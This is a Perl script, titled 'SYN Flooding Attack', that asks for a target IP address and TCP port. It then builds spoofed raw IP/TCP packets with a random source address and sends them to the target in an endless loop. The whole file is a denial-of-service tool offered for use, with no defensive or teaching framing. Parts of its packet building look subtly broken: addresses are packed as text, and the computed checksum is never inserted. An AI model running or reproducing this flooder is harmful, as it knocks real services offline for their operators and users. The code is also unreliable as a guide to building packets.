#!/usr/bin/perl

use Socket;
# SYN Flooding Attack

# Set info needed
print "\n============================";
print "\n[!] Enter the designated ip: "; # Set IP
$dst_host = <STDIN>;
chomp ($dst_host);
while (!($dst_host =~ /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)){
	print "\n[!] Enter the designated ip correctly: "; # Re-enter IP
	$dst_host = <STDIN>;
	chomp ($dst_host);
}

print "Designated IP ==> $dst_host";
print "\n============================";
print "\n[!] Enter TCP Port: "; # Set Port
$dst_port = <STDIN>;
chomp ($dst_port);
while (not ($dst_port =~ /^-?\d+$/ ) || ($dst_port <= 0 || $dst_port > 65535)){ 
	print "\n[!] Enter a TCP port correctly: "; # Re-enter Port       
	$dst_port = <STDIN>;
	chomp ($dst_port); 
} 

$src_host = randomIP(); # Random Source host
$src_port = int(rand(65535-1))+1; # Random source port

# start main attack	
main();

 
sub main 
{	
	socket(flood, AF_INET, SOCK_RAW, 255) or die "Failed to open raw socket"; # Raw socket is only open if user has root access
	my ($packet) = headers($src_host, $src_port, $dst_host, $dst_port);
	my ($destination) = pack('Sna4x8', AF_INET, $dst_port, $dst_host);	
	my $counter = 0;
	while(1) {	
		send(flood , $packet , 0 , $destination) or die "Send Failed";
		$counter ++ ;
		print "\n[~] Attacing the IP: $dst_host with port: $dst_port from IP: $src_host with port: $src_port. Counter: $counter"; 
	}
}

# generate  TCP and IP headers
sub headers 
{	
	local($src_host , $src_port , $dst_host , $dst_port) = @_;
	# TCP packet construction
	my $sequence_number = 123456; # 4 bytes
	my $aknowledgemet_number = 0; # 4 bytes 0 because we don't care about it
	my $data_offset = 5; # 4 bits . Has 5 if it doesn't use optional
	my $reserved = 0; # 6 bits always 0
	my $offset_reserved = $data_offset.$reserved;
	my $control_flags ="000010"; # 6 bits for urgent,ack,push,reset,syn,fin flags
	my $window_size = 255; # 2 bytes
	my $checksum = 0; # 2 bytes initial 0
	my $urgent_pointer = int(rand(256)); #2 bytes random number for values in first byte only
	
	
	#create tcp header with checksum = 0
	my $tcp_header = pack('nnNNH10B6nvn' , $src_port , $dst_port , $sequence_number, $aknowledgemet_number , $offset_reserved, $control_flags,  124 ,0, 44);
	my $tcp_temp = pack('a4a4CCn' , $src_host, $dst_host, 0, 6, length($tcp_header)) . $tcp_header;
	
	#use the previous tcp header to find the checksum
	$checksum = &checksum($tcp_temp);
	
	$tcp_header = pack('nnNNB10B6nvn' , $src_port , $dst_port , $sequence_number, $aknowledgemet_number , $offset_reserved, $control_flags,  124 ,0, 44);
	
	# IP packet construction
    my $ip_version = 4; # 4 bits
    my $ip_ihl = 5; # 4 bits
    my $ip_typeofservice = "00"; #1 bytes;
    my $ip_total_length = length($tcp_header) + 20; # 2 bytes	
    my $ip_identification = int(rand(65536)); # 2 bytes
    my $ip_time_to_live = 20;
    my $ip_protocol = 6;    # 6 for IPPROTO_TCP
    my $ip_fragment_flag = "010";  # 3 bits
    my $ip_fragment_offset = "0000000000000"; # 13 bits
    my $ip_fragment = $ip_fragment_flag . $ip_fragment_offset;
	my $ip_checksum = 0; # 2 bytes
	my $ip_header = pack('H4H4CnnB16CCna4a4', $ip_version,$ip_ihl, $ip_typeofservice,$ip_total_length,$ip_identification,$ip_fragment,$ip_time_to_live,$ip_protocol ,$ip_checksum, $src_host , $dst_host);	
	
	# final packet
	my $pkt = $ip_header . $tcp_header;
	# packet is ready
	return $pkt;
}


#Calculates checksum
sub checksum 
{
	my ($message) = @_;
	local ($message_length,$num_part,$part,$chksum);
	$message_length = length($message);
	$num_part = $message_length / 2;
	$chksum = 0;	
	foreach $part (unpack("S$num_part", $message)) 
	{
		$chksum += $part;
	}
	if ($message_length % 2) {
		$chksum += unpack("C", substr($message, $message_length - 1, 1));
	}	
	$chksum = ($chksum >> 16) + ($chksum & 0xffff);	
	return(~(($chksum >> 16) + $chksum) & 0xffff);
} 

# Generates Random Ip
sub randomIP{
    return int(rand(256)) . "." . int(rand(256)) . "." . int(rand(256)). "." . int(rand(256));
}
